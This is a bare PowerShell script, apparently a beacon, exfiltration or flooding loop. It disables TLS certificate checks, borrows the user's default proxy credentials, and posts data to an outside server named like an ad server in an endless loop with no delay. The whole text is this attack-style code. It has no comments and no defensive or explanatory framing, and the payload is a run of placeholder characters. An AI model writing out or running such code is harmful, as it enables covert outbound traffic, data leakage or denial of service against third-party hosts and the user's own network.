$url='http://theadserver.net/index.php';
$running = 1;
$sleep = 0 ;
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
$wc = new-object system.net.WebClient;
$proxy = [System.Net.WebRequest]::GetSystemWebProxy();
$proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
$wc.proxy = $proxy; 
while($running){ 
$nvc = new-object System.Collections.Specialized.NameValueCollection
$nvc.Add('data','xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx')
$wc.UploadValues($url, $nvc) 
Start-Sleep $sleep};


